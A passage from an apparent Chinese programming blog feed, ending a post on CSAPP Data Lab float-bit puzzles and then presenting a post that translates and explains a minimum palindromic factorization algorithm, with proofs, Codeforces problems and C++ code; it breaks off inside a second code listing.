(!(e^<span class="number">0xff</span>)) <span class="keyword">return</span> uf;</span><br><span class="line">  <span class="keyword">if</span> (!e) <span class="keyword">return</span> (s &lt;&lt; <span class="number">31</span>) | (f &lt;&lt; <span class="number">1</span>);</span><br><span class="line">  <span class="keyword">return</span> (s &lt;&lt; <span class="number">31</span>) | ((e + <span class="number">1</span>) &lt;&lt; <span class="number">23</span>) | f;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="floatFloat2Int-uf"><a href="#floatFloat2Int-uf" class="headerlink" title="floatFloat2Int(uf)"></a>floatFloat2Int(uf)</h3><p><strong>要求</strong>：将浮点数 uf 转换成整数。 </p><p><strong>运算</strong>：Integer/unsigned 相关运算；||，&amp;&amp;，if 和 while 等判断语句。</p><p><strong>做法</strong>：当浮点数是 0 和规格化的值时，才有可能用整数表示，其余部分注意整数表示范围即可。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">floatFloat2Int</span><span class="params">(<span class="keyword">unsigned</span> uf)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> s = uf &gt;&gt; <span class="number">31</span> &amp; <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">int</span> e = uf &gt;&gt; <span class="number">23</span> &amp; <span class="number">0xff</span>;</span><br><span class="line">  <span class="keyword">int</span> f = uf ^ (s &lt;&lt; <span class="number">31</span>) ^ (e &lt;&lt; <span class="number">23</span>);</span><br><span class="line">  <span class="keyword">if</span> (!(e | f)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  e = e - <span class="number">0x7f</span>;</span><br><span class="line">  <span class="keyword">if</span> (e &lt; <span class="number">0</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> (e &gt; <span class="number">30</span> + (s &amp; !f)) <span class="keyword">return</span> <span class="number">0x80000000</span>u;</span><br><span class="line">  f = ((<span class="number">1</span> &lt;&lt; <span class="number">23</span>) | f) &gt;&gt; (<span class="number">23</span> - e);</span><br><span class="line">  <span class="keyword">if</span> (s) <span class="keyword">return</span> -f;</span><br><span class="line">  <span class="keyword">return</span> f;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="floatPower2-x"><a href="#floatPower2-x" class="headerlink" title="floatPower2(x)"></a>floatPower2(x)</h3><p><strong>要求</strong>：使用浮点数表示 2^x。无法表示时：过小返回 0，过大返回 +INF。</p><p><strong>运算</strong>：Integer/unsigned 相关运算；||，&amp;&amp;，if 和 while 等判断语句。</p><p><strong>做法</strong>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="title">floatPower2</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">  x = x + <span class="number">0x7f</span>;</span><br><span class="line">  <span class="keyword">if</span> (x &lt; <span class="number">0</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> x &lt; <span class="number">0xff</span> ? x &lt;&lt; <span class="number">23</span> : <span class="number">0x7f800000</span>u;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;自动测试&quot;&gt;&lt;a href=&quot;#自动测试&quot; class=&quot;headerlink&quot; title=&quot;自动测试&quot;&gt;&lt;/a&gt;自动测试&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;&lt;p&gt;使用 dlc 检测代码是否符合题目要求&lt;/p&gt;
&lt;figure class=&quot;highlight bash
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>回文分解算法</title>
    <link href="http://mcginn7.github.io/2019/11/20/Palindromic-Factorization/"/>
    <id>http://mcginn7.github.io/2019/11/20/Palindromic-Factorization/</id>
    <published>2019-11-20T11:30:36.000Z</published>
    <updated>2019-11-28T03:19:26.596Z</updated>
    
    <content type="html"><![CDATA[<p>内容基本是翻译自论文《A Subquadratic Algorithm for Minimum Palindromic Factorization》，主要对文章进行翻译，力图简化算法的证明过程并给出相应的结论。简化证明过程可能存在不严谨的地方，如有需要可自行查看参考资料中的论文原文。</p><h2 id="太长不看版"><a href="#太长不看版" class="headerlink" title="太长不看版"></a>太长不看版</h2><p>给定一字符串，对于每个右端点为 $r$ 的回文子串，将左端点记为 $l_1\lt l_2\lt \dots \lt l_k$，记间距 $Δ_i=l_i-l_{i-1}$，结论有：</p><ol><li>间距 $Δ_i$ 构成单调递减序列（严格来说，是单调非增序列），即 $\forall i&gt;1,Δ_i\ge Δ_{i-1}$。</li><li>间距 $Δ_i$ 不超过 $\log(r)$ 种。</li></ol><p>基于上述 2 点结论，可以在 $\log(r)$ 时间内利用端点 $r-1$ 的信息计算得到 $r$ 的回文左端点，进而对字符串进行回文分解。 </p><p>时间复杂度 $O(N\log N)$，空间复杂度 $O(N)$。</p><h2 id="问题背景"><a href="#问题背景" class="headerlink" title="问题背景"></a>问题背景</h2><p>给定长为 $N$  的字符串 $S$，在 $O(N\log N)$ 时间内对字符串 $S$ 分解为最少数量的回文子串，即最小回文分解：</p><script type="math/tex; mode=display">S = S_1S_2\dots S_l</script><p>其中，$S_i$ 都是<strong>回文串</strong>。</p><h2 id="论文摘录"><a href="#论文摘录" class="headerlink" title="论文摘录"></a>论文摘录</h2><h3 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h3><p>首先，定义 $PL(S)$ 表示字符串 $S$ 的最小回文分解的子串数量。如 $PL(abaab)=2$，拆分成 $a$ 和 $baab$ 两个子回文串。</p><p>通过<strong>动态规划</strong>的思想，可以在 $O(N^2)$ 时间内计算 $PL(S)$：</p><script type="math/tex; mode=display">PL(S[1..j])=\min _i \{PL(S[1..i-1])+1 : i\le j, S[i..j]\ is\ a\ palindrome\}</script><p>具体实现为：对于每个右端点 $j$，维护一个左端点集合 $P_j$，对于每个 $i\in P_j$ 都有 $S[i..j]$ 是回文串。基于集合 $P_j$ 可以枚举计算得到 $P_{j+1}$ 集合：如果 $S[i..j]$ 是回文串且 $S[i-1]=S[j+1]$，则 $i-1\in P_{j+1}$。</p><p>该论文的算法主要改进左端点 $P_j$ 的表示，利用回文串的性质将左端点划分成 $O(\log j)$ 个<strong>等差数列</strong>的集合 $G_j$，在 $O(\log j)$ 时间内从 $G_{j-1}$ 转移计算 $G_j$。</p><hr><p><strong>Border</strong>：串 $y$ 是串 $x$ 的 border 表示 $y$ 既是 $x$ 的前缀也是 $x$ 的后缀。</p><ol><li><p>$x$ 也是其本身的 border。</p></li><li><p>当 $y \neq x$ 时，称其为 <strong>proper border</strong>。</p></li></ol><hr><h3 id="引理1"><a href="#引理1" class="headerlink" title="引理1"></a>引理1</h3><p>记串 $y$ 为回文串 $x$ 的后缀，则 $y$ 是 $x$ 的 border 当且仅当 $y$ 是回文串。</p><h3 id="引理2"><a href="#引理2" class="headerlink" title="引理2"></a>引理2</h3><p>记串 $y$ 为串 $x$ 的 border 并且 $|x|\le 2|y|$，那么 $x$ 是回文串当且仅当 $y$ 是回文串。</p><h3 id="引理3"><a href="#引理3" class="headerlink" title="引理3"></a>引理3</h3><p>记串 $y$ 为回文串 $x$ 的<strong>真后缀（proper suffix）</strong>，那么 $|x|-|y|$ 是 $x$ 的周期（period）当且仅当 $y$ 是回文串。特别地，$|x|-|y|$ 是 $x$ 最小周期当且仅当 $y$ 是 $x$ 的最长回文真后缀。</p><ul><li>部分网上博文将 period 译为循环节是不太准确的。例如 $x=aba$ 和 $y=a$，此时 $|x|-|y|=2$，并不能整除 $|x|=3$。因此，这里我译为周期。</li></ul><h3 id="引理4"><a href="#引理4" class="headerlink" title="引理4"></a>引理4</h3><p>记 $x$ 为回文串，$y$ 是 $x$ 的最长回文真后缀，$z$ 是 $y$ 的最长回文真后缀，以及 $u, v$ 满足 $x=uy$ 和 $y=vz$，则有：</p><p>(1) $|u|\ge |v|$;</p><p>(2) 如果 $|u|\gt |v|$，则 $|u| \gt |z|$;</p><p>(3) 如果 $|u|=|v|$，则 $u=v$。</p><p><strong>证明</strong></p><p>(1) 根据<strong>引理3</strong>，$|u|=|x|-|y|$ 是 $x$ 的最小周期，$|v|=|y|-|z|$ 是 $y$ 的最小周期。根据 $|y|$ 的长度分两种情况考虑：</p><ol><li>当 $2|y|\le |x|$ 时，有 $|u|\ge|y|&gt;|v|$。</li><li>当 $2|y|&gt;|x|$ 时，$u$ 是 $x$ 的周期同时也是 $y$ 的周期。由于 $v$ 是 $y$ 的最小周期，因此 $|u| \ge |v|$。</li></ol><p>(2) 显然，根据 $x,y$ 均是回文串，可知 $v$ 是 $x$ 的前缀，记 $x=vw$。根据回文串性质，如图 1 所示， $z$ 是 $w$ 的 border 且 $|w|=|zu|$（注意，这里仅仅是长度相等，并不是说 $w=zu$）。根据条件 $|u|\gt |v|$，可得 $|w|&gt;|y|$。这里使用<strong>反证法</strong>，假设结果不成立即 $|u|\le |z|$，那么 $|w|=|zu|\le 2|z|$，而根据<strong>引理2</strong>的结论 $w$ 是回文串，与 $y$ 是 $x$ 的最长回文真后缀相矛盾，因此假设不成立。</p><img src="/2019/11/20/Palindromic-Factorization/image-20191120213959957.png"><p><center>图 1. 反证法的结果图</center><br>(3) 上述证明过程中可知 $v$ 是 $x$ 的前缀，并且 $u$ 也是 $x$ 的前缀。在 $|u|=|v|$ 的条件下，显然 $u=v$。</p><h3 id="引理5"><a href="#引理5" class="headerlink" title="引理5"></a>引理5</h3><p>回文左端点集合 $P_j$ （有序）的点间距是非增的，并且最多有 $O(\log j)$ 种间距。</p><p><strong>证明</strong> </p><p>对于任意 $i\in [2..|P_j|-1]$，记 $x = S[p_{i-1}..j], y=S[p_i..j],z=S[p_{i+1}..j]$，则间距有 $|u|=|x|-|y|$ 和 $|v|=|y|-|z|$。</p><p>根据<strong>引理4(1)</strong>有 $|u|\ge|v|$，从而间距非增。一旦间距发生变化即 $|u|\gt |v|$，根据<strong>引理4(2)</strong>有 $|u|&gt;|z|$，进而 $|x|&gt;|u|+|z|&gt;2|z|$，长度至少翻倍，因而发生变化的次数不超过 $O(\log j)$，也就是说只有 $O(\log j)$ 种间距。</p><hr><p>对于任意正整数间距 Δ，定义</p><script type="math/tex; mode=display">P_{j,Δ}=\{p_i:1<i\le m, p_i-p_{i-1}=Δ\}</script><p>特别地，定义 $P_{j,∞}=\{p_1\}$。</p><p>对于每个非空 $P_{j,Δ}$ 可以使用三元组 $(\min P_{j,Δ},Δ,|P_{j,Δ}|)$ 表示，同时定义 $G_j$ 为按 Δ 降序的三元组列表，其大小为 $O(\log j)$。</p><hr><h3 id="引理6"><a href="#引理6" class="headerlink" title="引理6"></a>引理6</h3><p>记 $p_i$ 和 $p_{i+1}$ 为集合 $P_{j-1,Δ}$ 的两个<strong>连续</strong>元素，则 $p_i-1\in P_j$ 当且仅当 $p_{i+1}-1\in P_j$。</p><p><strong>证明</strong></p><p>根据定义有 $p_{i+1}-p_i=Δ$ 和 $p_i - p_{i-1}=Δ$，根据<strong>引理4(3)</strong>可得 $S[p_i-1]=S[p_{i+1}-1]=c$。当 $S[j]=c$，显然有 $p_i -1\in P_j \Leftrightarrow p_{i+1}-1\in P_j$，也就是说 $p_i-1$ 和 $p_{i+1}-1$ 都能和右端点 $j$ 构成回文串。</p><p>利用<strong>引理6</strong>，对于集合 $P_{j, Δ}$ 可以常数时间内更新，也就是可以在 $O(\log j)$ 时间内利用 $G_{j-1}$ 计算得到 $G’_j$：</p><script type="math/tex; mode=display">G'_j =\{(i-1, Δ,k):(i, Δ,k)\in G_{j-1},i>1,and\ S[i-1]=S[j]\}</script><p>注意从 $P_{j-1}$ 转移得到 $P_j$ 的过程中，部分左端点 $p_i-1$ 不能够与 $j$ 形成回文串而被剔除，因此 $P_j$ 中的间距会发生改变，需要进一步调整得到正确的三元组列表 $G_j$。</p><p>考虑 $P_{j-1,Δ}$ 中的三元组 $(p_i,Δ,k)$，当 $S[p_i-1]=S[j]$ 时，三元组 $(p_i-1,Δ,k)$ 插入到 $G_j$ 中。根据 $P_{j,Δ}$ 的定义，$p_i$ 的前一个元素 $p_{i-1}=p_i-Δ$，左端点 $p_{i-1}$ 可能不与 $j$ 形成新回文串而被剔除，此时 $P_j$ 中的 $p_i-1$ 的前一个元素不为 $p_{i-1}-1$，即新间距 $Δ’\gt Δ$。另一方面，旧端点的剔除只会影响每个组的首元素，因此只需将 $(p_i,Δ,k)$ 拆分成 $(p_i-1, Δ’,1)$ 和 $(p_i-1+Δ,Δ,k-1)$ 插入到 $G_j$ 中即可。</p><p>因为 $G_j$ 是有序的，所以具体实现过程中可实时记录前一个左端点的位置，以此计算新的间距 $Δ’$。此外，由于 $Δ’&gt;Δ$ 且间距是非增的，所以 $(p_i-1,Δ’,1)$ 可能与前一三元组具有相同的间距。通过合并相同间距的三元组，最终得到列表 $G_j$。</p><hr><h3 id="引理8"><a href="#引理8" class="headerlink" title="引理8"></a>引理8</h3><p>对于 $k\ge 2$，如果 $(i,Δ,k)\in G_j$，那么 $(i,Δ,k-1)\in G_{j-Δ}$。</p><p><strong>证明</strong></p><p>根据定义，$(i,Δ,k)\in G_j$ 等价于 $P_{j, Δ}=\{i,i+Δ,\dots, i+(k-1)Δ\}$。</p><p>要证明 $(i, Δ,k-1)\in G_{j-Δ}$，相当于要证明以下两点：</p><ol><li>$P_{j-Δ,Δ}\cap [i-Δ+1..j-Δ]=\{i,i+Δ,\dots, i+(k-2)Δ\}$；</li><li>$P_{j-Δ,Δ}\cap [1..i-Δ]=\emptyset$。</li></ol><p>记 $x=S[i-Δ..j],y=S[i..j]$。因为 $x,y$ 均是回文串，因此有 $S[i-Δ..j-Δ]=S[i..j]$，如图 2所示。因为两个串相等，显然 $\forall l\in [i..j]$，都有 $l\in P_j\Leftrightarrow l-Δ\in P_{j-Δ}$。更进一步地，两者的左端点间距也是相同的，即 $\forall l\in (i..j]$，有 $l \in P_{j,Δ}\Leftrightarrow l-Δ\in P_{j-Δ,Δ}$（<strong>注意：</strong>区间是左开右闭的）。因为 $\min P_{j,Δ} = i$，所以 $i-Δ\notin [i-Δ+1..j-Δ]$，第 1 点得证。</p><img src="/2019/11/20/Palindromic-Factorization/image-20191121212552874.png"><p><center>图 2. y是x的border</center><br>接下来证明第 2 点。要证明 $P_{j-Δ,Δ}\cap [1..i-Δ]=\emptyset $，只需要证明 $i-2Δ\notin P_{j-Δ}$，即串 $S[i-2Δ..j-Δ]$ 不是回文串。</p><p>使用<strong>反证法</strong>证明：假设 $S[i-2Δ..j-Δ]$ 是回文串。记 $w=S[i-2Δ..i-Δ-1]$，$w^R$ 表示串 $w$ 的反转串，如图 3所示。</p><p>因为 $S[i-2Δ..j-Δ]$ 是回文串，所以 $S[j-Δ+1..j-Δ]=w^R$。</p><p>因为 $S[i-Δ..j-Δ]$ 和 $S[i-Δ..j]$ 是回文串，所以有 $S[i-Δ..i-1]=w$ 和 $S[j-Δ+1..j]=w^R$，所以 $S[i-2Δ..j]=wS[i-Δ..j-Δ]w^R$ 也是回文串，即 $i-Δ\in P_{j,Δ}$。这与定义的 $i=\min P_{j,Δ}$ 相矛盾，所以假设不成立，即 $i-2Δ \notin P_{j-Δ}$。</p><img src="/2019/11/20/Palindromic-Factorization/image-20191121215159983.png"><p><center>图 3. S[i-2Δ..j-Δ]为回文串的示意图</center><br><strong>引理8</strong>阐述了一个事实：当 $|P_{j,Δ}|\ge 2$ 时，$P_{j,Δ} = P_{j-Δ,Δ}\cup\{\max P_{j,Δ}\}$，即 $P_{j,Δ}$ 仅多了一个元素而已。因此在计算 $PL_{j,Δ} = \min \{PL[i-1]+1:i\in P_{j,Δ}\}$ 时，只需考虑多出来的那个元素，维护 $PL_{j-Δ,Δ}$ 的信息即可加速计算。</p><p>那么在具体实现中如何维护 $PL_{j-Δ,Δ}$ 呢？暴力做法直接套 <em>map</em>，这样的空间复杂度为 $O(N\log N)$。接下来的<strong>引理9</strong>可将空间复杂度降至 $O(N)$。</p><hr><h3 id="引理9"><a href="#引理9" class="headerlink" title="引理9"></a>引理9</h3><p>记 $m=\min P_{j,Δ}-Δ$，则 $\forall l\in [j-Δ+1..j-1]$，有 $m\notin P_l$。</p><p><strong>证明</strong></p><p><strong>反证法</strong>：假设存在 $l\in [j-Δ+1..j-1]$，意味着 $S[m..l]$ 是回文串。</p><p>记 $h=l-(j-Δ)$，则 $S[m+h..l-h]$ 也是回文串，并且 $m&lt;m+h&lt;m+Δ$。</p><p>然而 $l-h$ 实际上等于 $j-Δ$，所以 $m+d\in P_{j-Δ,Δ}$。并且根据定义有 $m+Δ=\min P_{j-Δ,Δ}$，而 $m+h$ 则介于 $m$ 和 $m+Δ$ 之间，与定义 $P_{j-Δ,Δ}$ 相矛盾，即 $m+Δ$ 的前一个元素为 $m+h$ 而非 $m$ ，因此假设不成立。</p><img src="/2019/11/20/Palindromic-Factorization/image-20191122105243688.png"><p><center>图 4. 假设成立的结果图</center><br><strong>引理9</strong>说明位置 $m$ 在右端点范围 $[j-Δ,j]$ 中只会被 $j-Δ$ 和 $j$ 更新和使用，因此可将 $PL_{j-Δ,Δ}$ 的结果存放在 $GPL[m]$ 中，从而将空间复杂度降低至 $O(N)$。</p><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><h3 id="Palindrome-Partition"><a href="#Palindrome-Partition" class="headerlink" title="Palindrome Partition"></a>Palindrome Partition</h3><p><strong>来源</strong>  <a href="codeforces.com/problemset/problem/932/G">Codeforces 932G</a></p><p><strong>题意</strong>  给一字符串 $s(2\le s\le10^6)$，且 $|s|$ 是偶数。现要将串 $s$ 划分成<strong>偶数</strong>个子串 $(p_1,p_2,\dots,p_{2k})$，满足 $\forall i\in [1,2k], p_i=p_{2k-i+1}$。求满足条件的方案数，结果对 $10^9+7$ 取模。</p><p><strong>分析</strong>  串长 $|s| $ 是偶数，子串数量也是偶数，因此将串 $s$ 折半并按 $s_1s_ns_2s_{n-1}…s_{n/2}s_{n/2+1}$ 构造新串，便将原问题转换成将原串分解为若干偶数长度子回文串的方案数。</p><hr><h3 id="Reverses"><a href="#Reverses" class="headerlink" title="Reverses"></a>Reverses</h3><p><strong>来源</strong>  <a href="codeforces.com/problemset/problem/906/E">Codeforces 906E</a></p><p><strong>题意</strong>   给定两个字符串 $s, t(1\le |s|=|t| \le 5\times 10^5)$，允许翻转串 $t$ 若干<strong>不相交</strong>子串，使得翻转后串 $t$ 等于 $s$，求最少需要子串个数，并给出任一方案。</p><p><strong>分析</strong>  首先构造串 $str=s_1t_1s_2t_2\dots s_nt_n$。如果子串 $t[i..j]$ 翻转后与串 $s[i..j]$ 相等，则子串 $s_it_i..s_jt_j$ 是回文串。而如果子串 $t[i..j]=s[i..j]$，则 $s_it_i..s_jt_j$ 最坏情况下会分解成若干长度为 2 的子回文串。于是原问题转化成对串 $str$ 进行回文分解，在状态转移过程中长度为 2 的回文串在原问题中不属于翻转串，因此其代价为 0。</p><h2 id="参考代码"><a href="#参考代码" class="headerlink" title="参考代码"></a>参考代码</h2><h3 id="回文分解模板"><a href="#回文分解模板" class="headerlink" title="回文分解模板"></a>回文分解模板</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">double</span> db;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">long</span> <span class="keyword">long</span> ll;</span><br><span class="line"><span class="keyword">typedef</span> <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; vi;</span><br><span class="line"><span class="keyword">typedef</span> pair&lt;<span class="keyword">int</span>, <span class="keyword">int</span>&gt; pii;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> fi first</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> se second</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> pb push_back</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> mp make_pair</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> sz(x) ((int)(x).size())</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> all(x) begin(x),end(x)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> rep(i,l,r) for(int i=(l);i&lt;(r);++i)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> per(i,l,r) for(int i=(r)-1;i&gt;=(l);--i)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> dd(x) cout &lt;&lt; #x &lt;&lt; <span class="meta-string">"="</span> &lt;&lt; x &lt;&lt; <span class="meta-string">", "</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> de(x) cout &lt;&lt; #x &lt;&lt; <span class="meta-string">"="</span> &lt;&lt; x &lt;&lt; endl</span></span><br><span class="line"><span class="comment">//-------</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> N = <span class="number">1e5</span> + <span class="number">7</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> M = <span class="number">100</span>; <span class="comment">// Ensure M = k*log(N)</span></span><br><span class="line"><span class="keyword">int</span> PL[N], GPL[N];</span><br><span class="line">tuple&lt;<span class="keyword">int</span>, <span class="keyword">int</span>, <span class="keyword">int</span>&gt; g[M], G[M];</span><br><span class="line"></span><br><span class="line"><span class="comment">// Ensure str[|str|] = '\0'</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Palindromic</span><span class="params">(<span class="keyword">char</span> *str)</span> </span>&#123;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> *S = str - <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> n = <span class="built_in">strlen</span>(str);</span><br><span class="line"><span class="keyword">int</span> G_size = <span class="number">0</span>;</span><br><span class="line">PL[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">rep(j, <span class="number">1</span>, n + <span class="number">1</span>) &#123;</span><br><span class="line"><span class="keyword">int</span> i, d, k, g_size = <span class="number">0</span>;</span><br><span class="line">swap(g_size, G_size);</span><br><span class="line">rep(_, <span class="number">0</span>, g_size) g[_] = G[_];</span><br><span class="line"></span><br><span class="line">rep(_, <span class="number">0</span>, g_size) &#123;</span><br><span class="line">tie(i, d, k) = g[_];</span><br><span class="line"><span class="keyword">if</span> (i &gt; <span class="number">1</span> &amp;&amp; S[i - <span class="number">1</span>] == S[j])</span><br><span class="line">G[G_size++] = &#123;i - <span class="number">1</span>, d, k&#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">g_size = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> r = -j;</span><br><span class="line">rep(_, <span class="number">0</span>, G_size) &#123;</span><br><span class="line">tie(i, d, k) = G[_];</span><br><span class="line"><span class="keyword">if</span> (i - r != d) &#123;</span><br><span class="line">g[g_size++] = &#123;i, i - r, <span class="number">1</span>&#125;;</span><br><span class="line"><span class="keyword">if</span> (k &gt; <span class="number">1</span>)</span><br><span class="line">g[g_size++] = &#123;i + d, d, k - <span class="number">1</span>&#125;;</span><br><span class="line">&#125; <span class="keyword">else</span> </span><br><span class="line">g[g_size++] = &#123;i, d, k&#125;;</span><br><span class="line">r = i + (k - <span class="number">1</span>) * d;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (j &gt; <span class="number">1</span> &amp;&amp; S[j - <span class="number">1</span>] == S[j]) &#123;</span><br><span class="line">g[g_size++] = &#123;j - <span class="number">1</span>, j - <span class="number">1</span> - r, <span class="number">1</span>&#125;;</span><br><span class="line">r = j - <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">g[g_size++] = &#123;j, j - r, <span class="number">1</span>&#125;;</span><br><span class="line"></span><br><span class="line">G_size = <span class="number">0</span>;</span><br><span class="line">tie(i, d, k) = g[<span class="number">0</span>]; </span><br><span class="line">rep(_, <span class="number">1</span>, g_size) &#123;</span><br><span class="line"><span class="keyword">if</span> (get&lt;<span class="number">1</span>&gt;(g[_]) == d)</span><br><span class="line">k += get&lt;<span class="number">2</span>&gt;(g[_]);</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">G[G_size++] = &#123;i, d, k&#125;;</span><br><span class="line">tie(i, d, k) = g[_];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">G[G_size++] = &#123;i, d, k&#125;;</span><br><span class="line"></span><br><span class="line">PL[j] = j;</span><br><span class="line">rep(_, <span class="number">0</span>, G_size) &#123;</span><br><span class="line">tie(i, d, k) = G[_];</span><br><span class="line">r = i + (k - <span class="number">1</span>) * d;</span><br><span class="line"><span class="keyword">int</span> m = PL[r - <span class="number">1</span>] + <span class="number">1</span>;</span><br><span class="line"><span class="keyword">if</span> (k &gt; <span class="number">1</span>) m = min(m, GPL[i - d]);</span><br><span class="line"><span class="keyword">if</span> (d &lt;= i) GPL[i - d] = m;</span><br><span class="line">PL[j] = min(PL[j], m);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> str[N];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">" %s"</span>, str);</span><br><span class="line">Palindromic(str);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Palindrome-Partition-1"><a href="#Palindrome-Partition-1" class="headerlink" title="Palindrome Partition"></a>Palindrome Partition</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span 